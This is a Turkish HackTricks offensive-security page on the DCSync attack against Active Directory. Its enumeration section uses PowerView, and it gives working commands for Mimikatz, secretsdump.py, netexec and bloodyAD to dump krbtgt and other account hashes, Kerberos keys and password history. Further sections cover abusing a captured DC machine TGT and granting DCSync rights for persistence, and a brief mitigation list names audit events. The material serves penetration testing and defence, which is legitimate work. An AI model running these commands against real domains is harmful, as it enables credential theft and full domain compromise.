# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** iznine sahip olmak, etki alanının kendisi üzerinde şu izinlere sahip olmayı gerektirir: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** ve **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**DCSync hakkında önemli notlar:**

- **DCSync saldırısı, bir Domain Controller'ın davranışını taklit eder ve Directory Replication Service Remote Protocol (MS-DRSR) kullanarak diğer Domain Controller'lardan bilgileri replike etmelerini ister.** MS-DRSR, Active Directory'nin geçerli ve gerekli bir işlevi olduğundan kapatılamaz veya devre dışı bırakılamaz.
- Varsayılan olarak yalnızca **Domain Admins, Enterprise Admins, Administrators ve Domain Controllers** grupları gerekli ayrıcalıklara sahiptir.
- Uygulamada, **tam DCSync** için etki alanı adlandırma bağlamında **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** gerekir. `DS-Replication-Get-Changes-In-Filtered-Set` genellikle bunlarla birlikte devredilir, ancak tek başına, tam bir krbtgt dökümünden ziyade **gizli / RODC tarafından filtrelenen özniteliklerin** (örneğin eski tip LAPS sırları) eşitlenmesiyle daha çok ilgilidir.<sup>[[2]](#references)</sup>
- Herhangi bir hesap parolası tersine çevrilebilir şifrelemeyle saklanıyorsa, Mimikatz'de parolayı açık metin olarak döndüren bir seçenek bulunur.

### Enumeration

`powerview` kullanarak bu izinlere kimin sahip olduğunu kontrol edin:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

DCSync haklarına sahip **varsayılan olmayan principal'lara** odaklanmak istiyorsanız, yerleşik replikasyon yapabilen grupları filtreleyin ve yalnızca beklenmedik trustee'leri inceleyin:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Yerel Olarak Exploit Et

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Uzaktan Exploit

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Kapsamı belirlenmiş pratik örnekler:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### Yakalanmış bir DC machine TGT (ccache) kullanarak DCSync

Bir domain controller üzerindeki servisi incelerken, yerel servis kimliğini ağ kimliğinden ayırt edin. [Microsoft belgelerinde](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) açıklandığı gibi, SQL Server virtual accounts (`NT SERVICE\...`) ağ kaynaklarına ana bilgisayarın computer account'u olarak erişir. Bir domain controller üzerinde bu durum, DC machine account'unu replication-rights incelemesi açısından önemli hâle getirebilir; ancak yalnızca servise erişim sağlamak, dışarı aktarılabilir bir machine TGT'nin veya kullanılabilir DCSync kimlik doğrulamasının mevcut olduğunu göstermez. Bunu bir saldırı yolu olarak değerlendirmeden önce gerçek servis kimliğini, giden kimlik doğrulama bağlamını, kullanılabilir ticket veya kimlik bilgilerini ve geçerli replication rights'ı doğrulayın.

Unconstrained-delegation export-mode senaryolarında bir Domain Controller machine TGT'sini (ör. `krbtgt@DOMAIN` için `DC1$@DOMAIN`) yakalayabilirsiniz. Ardından bu ccache'i kullanarak DC kimliğiyle kimlik doğrulaması yapabilir ve parola olmadan DCSync gerçekleştirebilirsiniz.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Operasyonel notlar:

- **Impacket'in Kerberos yolu, DRSUAPI çağrısından önce SMB'ye dokunur.** Ortamda **SPN target name validation** uygulanıyorsa, tam dump başarısız olabilir: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Bu durumda önce hedef DC için bir **`cifs/<dc>`** service ticket isteyin veya hemen ihtiyacınız olan hesap için **`-just-dc-user`** seçeneğini kullanın.
- Yalnızca daha düşük replication haklarına sahip olduğunuzda, LDAP/DirSync tarzı eşitleme, tam krbtgt replication olmadan **confidential** veya **RODC-filtered** öznitelikleri (örneğin eski `ms-Mcs-AdmPwd`) açığa çıkarabilir.<sup>[[2]](#references)</sup>

`-just-dc` 3 dosya oluşturur:

- **NTLM hash'lerini** içeren bir dosya
- **Kerberos anahtarlarını** içeren bir dosya
- [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkin olan hesaplar için NTDS'den alınan düz metin parolaları içeren bir dosya. Reversible encryption kullanan kullanıcıları şu komutla bulabilirsiniz:

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Kalıcılık

Etki alanı yöneticisiyseniz, PowerView yardımıyla bu izinleri herhangi bir kullanıcıya verebilirsiniz:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux operatörleri `bloodyAD` ile aynısını yapabilir:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Ardından, (ayrıcalıkların adlarını "ObjectType" alanında görebilmeniz gerekir) çıktıda bu 3 ayrıcalığın **kullanıcıya doğru şekilde atandığını kontrol edebilirsiniz**:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Azaltma

- Security Event ID 4662 (Nesne için Denetim İlkesi etkinleştirilmelidir) – Bir nesne üzerinde işlem gerçekleştirildi<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Nesne için Denetim İlkesi etkinleştirilmelidir) – Bir dizin hizmeti nesnesi değiştirildi
- Security Event ID 4670 (Nesne için Denetim İlkesi etkinleştirilmelidir) – Bir nesnenin izinleri değiştirildi
- AD ACL Scanner - ACL raporları oluşturun ve karşılaştırın. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket Değişiklik Günlüğü](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Get-Changes ve Get-Changes-In-Filtered-Set Çoğaltmasından Yararlanma](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Etki Alanı Denetleyicisinden Parola Hash'lerini Dökme](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL kimlik bilgileri → Hedefli Kerberoast → Kısıtlanmamış Delegasyon → DA'ya DCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
